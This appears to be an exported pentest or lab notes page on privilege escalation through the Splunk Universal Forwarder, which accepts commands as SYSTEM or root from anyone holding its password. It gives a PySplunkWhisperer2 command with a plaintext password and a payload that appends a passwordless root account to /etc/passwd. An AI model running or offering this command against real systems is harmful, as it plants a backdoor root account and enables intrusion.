<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>13- splunk</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>13- splunk</h1><br/><p><h2>Description</h2></p><p>Description:<ul><li>The Splunk Universal Forwarder Agent (UF) allows authenticated remote users to send single commands or scripts to the agents through the Splunk API. The UF agent doesnâ€™t validate connections coming are coming from a valid Splunk Enterprise server, nor does the UF agent validate the code is signed or otherwise proven to be from the Splunk Enterprise server. This allows an attacker who gains access to the UF agent password to run arbitrary code on the server as SYSTEM or root, depending on the operating system.</li></ul></p><p><h2>Exploit</h2><ul><li>splunk is present on the machine<ul><li>python PySplunkWhisperer2_remote.py --host 127.0.0.1 --port 8089 --username</li></ul></li></ul></p><p>jack --password TMqJytboF9mGbuRk --payload &quot;echo</p><p>&#39;user:pass:0:0:,,,:/root:/bin/bash&#39; &gt;&gt;</p><p>/etc/passwd&quot; --lhost 192.168.xxx.90</p></div>
</body>
</html>
